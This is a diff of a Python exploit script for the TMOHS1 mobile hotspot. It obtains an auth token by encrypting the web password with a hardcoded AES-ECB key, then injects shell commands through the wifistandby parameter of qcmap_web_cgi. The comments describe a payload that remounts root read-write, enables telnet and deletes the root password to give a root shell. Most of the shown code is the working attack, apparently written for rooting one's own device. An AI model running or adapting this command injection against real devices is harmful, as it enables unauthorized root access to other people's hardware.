@@ -1,15 +1,16 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-
-#################################################
-#    Exploit script for TMOHS1 hotspot
-#
-#    Gives us a root shell over telnet
-#    and offers several other useful functions
-#
-#    Created by natthawk
-#    Copyright 2022
-#################################################
+#-----------------------------------------------#
+#    Exploit script for TMOHS1 hotspot			#
+#												#
+#    Gives us a root shell over telnet			#
+#    and offers several utility functions		# 
+#												#
+#    Copyright (c) 2022 natthawk				#
+#												#				
+#	 This code is licensed under the GNU		#
+#	 General Public License, Version 3.			#	
+#-----------------------------------------------#
 
 from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
 from cryptography.hazmat.primitives import padding
@@ -19,6 +20,7 @@ import requests
 import time
 from getpass import getpass
 from utils import TelnetConnection,chooseAction,chPwdFlag
+
 # We have to get an authentication token for the exploit to work, provided by the
 # qcmap_auth cgi. The login page AES128-ECB encrypts the weblogin
 # password with this predefined [and incredibly insecure] key
@@ -31,13 +33,10 @@ encryptor = AES.encryptor()
 padder = padding.PKCS7(128).padder()
 
 
-passwd = getpass('''
-Enter your weblogin password, or the default password.
-The default password is Admin + [last 4 digits of your IMEI], e.g. Admin1234\n
-Password:''')
+passwd = getpass('''Enter your weblogin password:''')
 
 bPasswd = passwd.encode('utf-8')
-packedPasswd = padder.update(bPasswd) + padder.finalize()
+packedPasswd = padder.update(bPasswd) + padder.finalize()     # add some bytes to make ECB cooperate
 bCrypt = encryptor.update(packedPasswd) + encryptor.finalize()
 crypt = b64encode(bCrypt).decode("utf-8")
 
@@ -48,7 +47,7 @@ payload = {
     'user': 'admin'
 }
 
-# we manually URL encode the request because the python requests
+# we manually URL encode the request with safe='=+' because the python requests
 # module percent-encodes the '=' and '+' signs in the base64 'pwd' string,
 # which confuses qcmap_auth
 
@@ -70,9 +69,11 @@ print(f'Received authentication token from hotspot: {token}\n')
 print('Exploiting qcmap_web_cgi.\n\nWaiting for socket. . .\n')
 time.sleep(1)
 
-
+# this function injects the payload into a malformed request, but we still provide a token
+# because the cgi won't actually run its wifistandby update routine (our route of attack) otherwise
 def sendCmd(payloadStr):
-    # Not even bothering with auto url encoding, since we have to include so many url-unsafe characters
+    # Not even bothering with urllib.parse.urlencode, since we have to include so many characters that
+    # urlencode will get rid of in the name of "safety"
     payloadStr = f'10;$({payloadStr})'
     exploitPayload = f'page=savepowersaving&displaytimeout=undefined&wifistandby={payloadStr}&token={token}'
     return requests.post('http://192.168.0.1/cgi-bin/qcmap_web_cgi', data=exploitPayload)
@@ -85,8 +86,8 @@ Connection to device may reset. If you are running the exploit via WiFi,
 ensure that your device reconnects to the hotspot's network.
 This may take 20-30 seconds. . .'''
 )
-# This is the main payload. It remounts the root filesystem rw so we can change
-# the root password, enables telnet, and runs 'passwd -d root', which
+# This is the main payload. It remounts the root filesystem r/w so we can 
+# edit /etc/passwd, enables telnet, and runs 'passwd -d root', which
 # removes the password for root. We have to wait for the request to qcmap_web_cgi
 # to resolve, and the connection may reset, which is why it takes about 20-30 seconds.
 
